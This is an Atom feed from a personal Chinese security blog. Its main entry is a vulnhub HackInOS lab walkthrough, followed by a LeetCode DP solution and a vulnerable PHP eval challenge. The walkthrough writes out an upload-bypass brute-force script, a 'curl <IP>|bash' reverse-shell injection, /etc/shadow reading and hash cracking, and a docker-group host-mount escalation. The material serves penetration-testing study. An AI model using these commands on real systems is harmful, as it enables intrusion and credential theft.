<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>爱学习，爱分享，爱生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2019-05-02T03:14:35.979Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulnhub 靶机实战系列 HackInOS</title>
    <link href="https://wywwzjj.top/2019/04/07/vulnhub-%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-HackInOS/"/>
    <id>https://wywwzjj.top/2019/04/07/vulnhub-靶机实战系列-HackInOS/</id>
    <published>2019-04-07T13:24:18.000Z</published>
    <updated>2019-05-02T03:14:35.979Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>要想走得远，需时刻提醒自己，走出舒适区，接收新知识。</p><p>实战好玩，紧张刺激，但很难能针对性地练习某一种知识，更像是一种综合性的考试。</p><p>其次，大牛都说，渗透测试的本质就是信息收集，信息收集的充分性决定了日下来的可能性。可惜，信息收集最耗费的就是时间。对于新手来说，很容易得不偿失。这里表达并非是信息收集不需要练习，而是效益不高，平时的侧重点更应该放到对漏洞的敏感性训练上，否则即使你遇到漏洞依然发现不了，擦肩而过，这种情况就很尴尬了。</p><p>所以说，CTF 题目的练习是很重要的，将每个动作进行分解，练熟，以后遇到综合性的渗透也能游刃有余。</p><p>大型的 CTF 以及国际赛，考察的更是快速学习的能力，平常出烂了的套路题基本不会出现，没多大意义。一个陌生的情景下，对信息的搜集、漏洞的快速锁定以及漏洞的利用能力要求非常高，往往需要深入到源码底层，直接复制个 <code>exp</code> 打过去基本不会见效。出题人又不脑残，随便找个洞就来出题，或者简单粗暴的把环境搬过来，不是等人喷吗？</p><p>看了 <code>d3ckx1</code> 大佬的一些靶机渗透的<a href="https://www.anquanke.com/member/124858" target="_blank" rel="noopener">文章</a>，心里也痒痒的，自己也想试试能不能日进去 ：）。</p><p>然而，还没开始就结束了啊，<code>nmap</code> 和 <code>netdiscover</code> 都没扫到端口，太尴尬了。</p><p>注意开桥接模式！在此顺便补充下常用的几种<strong>虚拟机网络模式</strong>。</p><ul><li><p>bridged（桥接模式）</p><p>  在这种模式下，使用 <code>VMnet0</code> 虚拟交换机，虚拟机就像是局域网中的一台独立的主机，与宿主机一样，它可以访问网络内任何一台机器。再桥接模式下，可以手工配置它的 <code>TCP/IP</code> 配置信息（<code>IP</code>、子网掩码等，而且还要和宿主机处于同一网段），以实现通过局域网的网关或路由器访问互联网，还可以将 <code>IP</code> 和 <code>DNS</code> 设置成”自动获取“。</p><p>  在桥接模式中，使用VMnet0虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的IP地址。</p><ul><li>A1、A2、A、B 四个操作系统可以相互访问</li><li><p>A1、A2 的 IP 为“外网” IP，可以手动设置，也可以自动获取</p><p><img src="https://images0.cnblogs.com/blog/33509/201305/06230732-2bf87fc799ef41c989be329c62a3fe80.png" alt></p></li></ul></li><li><p>NAT（网络地址转换模式）</p><p>  使用 <code>NAT</code> 模式，就是让虚拟机借助 <code>NAT</code> （网络地址转换）功能，通过宿主机所在的网络来访问公网。也就是说，使用 <code>NAT</code> 模式可以实现在虚拟系统里访问互联网。<code>NAT</code> 模式下虚拟机的 <code>TCP/IP</code> 配置信息是由 <code>VMnet8</code> 虚拟网络的 <code>DHCP</code> 服务器提供的，因此 <code>IP</code> 和 <code>DNS</code> 一般设置为“自动获取”，因此虚拟系统也就无法和本局域网中的其他真实主机进行通讯。</p><p>  最大的优势是，虚拟机接入互联网非常简单，不需要进行其他的配置，只要宿主机能联网即可。</p><p>  <strong>如下图所示</strong></p><ul><li>A1、A2 可以访问 B</li><li>B 不可以访问 A1、A2</li><li>A1、A2、A相互访问</li><li><p>A1、A2 的 IP 为局域网 IP，可以手动配置，也可以自动获取</p><p><img src="https://images0.cnblogs.com/blog/33509/201305/06230741-3447f387a8f14f528ff5a23f5b569145.png" alt></p></li></ul></li><li><p>host-only（主机模式）</p><p>  虚拟机只能与虚拟机、主机互访，但虚拟机和外部的网络是被隔离开的，也就是不能上 <code>Internet</code>。</p><p>  在 host-only 模式下，虚拟系统的 TCP/IP 配置信息（如IP地址、网关地址、DNS服务器等），都是由VMnet1 虚拟网络的 DHCP 服务器来动态分配的。</p><p>  使用host-only方式：</p><ul><li>A、A1、A2 可以互访</li><li>A1、A2 不能访问 B</li><li>B 不能访问 A1、A2</li><li><p>A1、A2 为局域网 IP，可以手动配置，也可以设置成自动获取模式</p><p><img src="https://images0.cnblogs.com/blog/33509/201305/06230823-03336f6007ce428c80418ae11161dc22.png" alt></p></li></ul></li></ul><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先找 IP，<code>netdiscover</code> 启动！妈的，扫半天扫不到IP。换成桥接模式后重启，访客模式进去，直接查看 IP。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xne1vfncj20j20c7gob.jpg" alt></p><p>紧接着查看一下端口信息。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xnerjyghj20nx0b94bh.jpg" alt></p><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>扫目录发现有 <code>/upload.php</code> ，查看源码可得 GitHub 链接。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1zlqwx1alj20eq01xjrb.jpg" alt></p><p>来一波代码审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">    <span class="comment">// 直接爆破</span></span><br><span class="line">$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// shell.php/.</span></span><br><span class="line">$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="comment">// 只验证了文件名</span></span><br><span class="line">$check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$uploadOk = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://0x1.im/blog/php/php-function-getimagesize.html" target="_blank" rel="noopener">getimagesize 函数不是完全可靠的</a></p><p>修改成功。可按上面链接的方法改，也可直接在 post 内容里加上 <code>GIF98</code> 之类的头信息。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1xol2qxk6j20cw05874g.jpg" alt></p><p>再写一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    url = <span class="string">"http://192.168.0.106:8000/uploads/"</span></span><br><span class="line">    key = <span class="string">'2.php'</span> + str(i)</span><br><span class="line">    m5 = hashlib.md5(key.encode()).hexdigest()</span><br><span class="line">    url += m5 + <span class="string">'.php'</span></span><br><span class="line">    re = requests.get(url)</span><br><span class="line">    print(re.status_code)</span><br><span class="line">    <span class="keyword">if</span> re.status_code == <span class="number">200</span>:</span><br><span class="line">        print(url, <span class="number">23333333333333333333333333333333333333333333333333</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>或者按这种 <code>fuzz</code> 的办法，也可以用 <code>Burp</code> 中的 <code>instruder</code> ，不再赘述。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w test.txt --hc 404 http://localhost:8000/uploads/FUZZ.php</span><br></pre></td></tr></table></figure><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>直接弹 shell，成功。也可以执行 <code>nc</code> 命令把 bash 反弹出来。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.106</span>:<span class="number">8000</span><span class="regexp">/uploads/</span><span class="number">9</span>e2b0f7dd8852a2987e7ade6fb2e948f.php</span><br><span class="line">?<span class="number">1</span>=system(<span class="string">"curl 47.101.220.241|bash"</span>);</span><br></pre></td></tr></table></figure><h3 id="开始提权"><a href="#开始提权" class="headerlink" title="开始提权"></a>开始提权</h3><p>获取到低权限SHELL后我们通常做下面几件事</p><ul><li><p>检测操作系统的发行版本</p></li><li><p>查看内核版本</p></li><li><p>检测当前用户权限</p></li><li><p>列举 suid 文件</p></li><li><p>查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看内核信息</span></span><br><span class="line">uname -a</span><br><span class="line">Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">#</span><span class="bash"> 比较新，有相应的 cve 可以提权，然而要等一个多小时</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看以 root 运行的服务</span></span><br><span class="line">www-data@1afdd1f6b82c:/var/www/html$ ps -aux | grep root</span><br><span class="line">root   1  0.0  1.6 388000 16496 ?    Ss   09:12   0:00 apache2 -DFOREGROUND</span><br><span class="line">root   77  0.0  0.2  18000  2560 ?   Ss   09:12   0:00 /bin/bash /etc/init.d/delete.sh</span><br><span class="line">root       370  0.0  0.0   4200   676 ?        S    12:52   0:00 sleep 300</span><br><span class="line">www-data   390  0.0  0.0  11116   944 ?        S    12:57   0:00 grep root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 哈哈，还有个定时删除的任务</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">    rm -rf /var/www/html/uploads/*.php</span><br><span class="line">    sleep 300</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> suid</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/tail</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 能拿到 root 的哈希</span></span><br><span class="line">tail -n 100 /etc/shadow</span><br><span class="line">root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 把这个存为 <span class="built_in">hash</span></span></span><br><span class="line">john hash</span><br><span class="line">john --show</span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到密码：john</span></span><br></pre></td></tr></table></figure><p>无法直接在 <code>nc</code> 里切到 root，拿到密码之后连接 <code>ssh</code> 试试，密码错误，必须模拟一下终端设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br></pre></td></tr></table></figure><p>先看下 <code>flag</code> ，还是不行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">Life consists of details..</span><br></pre></td></tr></table></figure><p>那我们再找找，<code>/root</code> 目录下还有个东西。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat .port</span><br><span class="line">Listen to your friends..</span><br><span class="line">7*</span><br></pre></td></tr></table></figure><h3 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h3><p>找了下 7 开头的端口，发现没这玩意。不过我们遗漏了 MySQL，去看看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br><span class="line">/** MySQL database username */</span><br><span class="line">define('DB_USER', 'wordpress');</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define('DB_PASSWORD', 'wordpress');</span><br><span class="line">/* MySQL hostname */</span><br><span class="line">define('DB_HOST', 'db:3306');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 直接进入失败了</span></span><br><span class="line">mysql -u wordpress -p wordpress</span><br><span class="line">ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2 "No such file or directory")</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 先拿到 ip</span></span><br><span class="line">ping db -c 3</span><br><span class="line">64 bytes from experimental_db_1.experimental_default (172.18.0.2): icmp_seq=65 ttl=64 time=0.044 ms</span><br><span class="line"><span class="meta">#</span><span class="bash"> 还有一招</span></span><br><span class="line">arp -an</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 远程连接试试</span></span><br><span class="line">mysql -h 172.18.0.2 -u wordpress -p wordpress</span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; use wordpress;</span><br><span class="line">use wordpress;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MySQL [wordpress]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| host_ssh_cred         |</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [wordpress]&gt; select * from host_ssh_cred;</span><br><span class="line">select * from host_ssh_cred;</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| id                | pw                               |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="拿到权限"><a href="#拿到权限" class="headerlink" title="拿到权限"></a>拿到权限</h3><p>解密可得 <code>123456</code>，此时再试试 <code>ssh</code> 连接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hummingbirdscyber@vulnvm:~$ id</span><br><span class="line">uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)</span><br></pre></td></tr></table></figure><p>发现 docker 的身影</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">hummingbirdscyber@vulnvm:~$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class="line">252fa8cb1646        ubuntu              "/bin/bash"              6 weeks ago         Up 5 minutes                               brave_edison</span><br><span class="line">1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   6 weeks ago         Up 5 minutes        0.0.0.0:8000-&gt;80/tcp   experimental_wordpress_1</span><br><span class="line">81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   6 weeks ago         Up 5 minutes        3306/tcp, 33060/tcp    experimental_db_1</span><br></pre></td></tr></table></figure><p>进了几个容器看了下，找不到 <code>flag</code>，卡住了。</p><blockquote><p>We find that the Ubuntu image is available to us, so we use this to create a new docker container and mount the / directory of the host inside a folder called /root. After we run the docker image we go to /root/root and find a file called “flag”. When we open the file, we find our congratulatory flag.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/root -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>找了下 wp，有些大佬是这样玩的，为啥一定要加 <code>/:/root</code> ？</p><p>拿到权限就行，以后再补充。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;要想走得远，需时刻提醒自己，走出舒适区，接收新知识。&lt;/p&gt;
&lt;p&gt;实战好玩，紧张刺激，但很难能针对性地练习某一种知识，更像是一种综合性的考
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://wywwzjj.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode 322.Coin Change[DP]</title>
    <link href="https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/"/>
    <id>https://wywwzjj.top/2019/04/04/Leetcode-322-Coin-Change/</id>
    <published>2019-04-04T01:07:35.000Z</published>
    <updated>2019-04-04T01:57:42.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任何一种硬币组合能组成总金额，返回 <code>-1</code>。</p><p><strong>示例 1:</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: coins = [1, 2, 5], amount = 11</span><br><span class="line">输出:<span class="number"> 3 </span></span><br><span class="line">解释:<span class="number"> 11 </span>=<span class="number"> 5 </span>+<span class="number"> 5 </span>+ 1</span><br></pre></td></tr></table></figure><p><strong>示例 2:</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">输入: coins = [2], amount = 3</span></span><br><span class="line"><span class="section">输出: -1</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>考虑状态方程，需描述出组合成总金额所花最少的硬币个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dp[i][j] 表示使用前 i 种硬币表示总额 j 所用的最少硬币数</span></span><br><span class="line"><span class="comment"># 初始状态 dp[-1][j] = ∞  dp[i][0] = 0</span></span><br><span class="line">dp[i][j] = min(dp[i][j], dp[i<span class="number">-1</span>][j-coin_i*k] + k)</span><br><span class="line"> = min(dp[i][j], dp[i][j-coin_i] + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 观察发现都具有 dp[i]，进一步压缩，使用滚动数组</span></span><br><span class="line">dp[j] = min(dp[j], dp[j-coin_i] + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>以<strong>示例 1 </strong>为例</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1qceh5ejjj20qb035gll.jpg" alt></p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p><strong>DP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行用时：1672 ms，击败了 39.85% 的用户</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(self, coins: List[int], amount: int)</span> -&gt; int:</span></span><br><span class="line">    dp = [amount+<span class="number">1</span>] * (amount + <span class="number">5</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(amount+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> (i - coin &gt;= <span class="number">0</span>):</span><br><span class="line">            dp[i] = min(dp[i], dp[i-coin] + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span> <span class="keyword">if</span> dp[amount] &gt;= amount + <span class="number">1</span> <span class="keyword">else</span> dp[amount]</span><br></pre></td></tr></table></figure><p><strong>DFS + greedy + pruning</strong></p><p>待补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;给定不同面额的硬币 coins 和一个总金额 amount。编写一个函数来计算可以凑成总金额所需的最少的硬币个数。如果没有任
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字 webshell</title>
    <link href="https://wywwzjj.top/2019/04/02/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-webshell/"/>
    <id>https://wywwzjj.top/2019/04/02/无字母数字-webshell/</id>
    <published>2019-04-02T15:19:52.000Z</published>
    <updated>2019-04-04T01:55:40.421Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="webshell" scheme="https://wywwzjj.top/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>PHP SECURITY CALENDAR Writeup</title>
    <link href="https://wywwzjj.top/2019/03/02/PHP-SECURITY-CALENDAR-2017/"/>
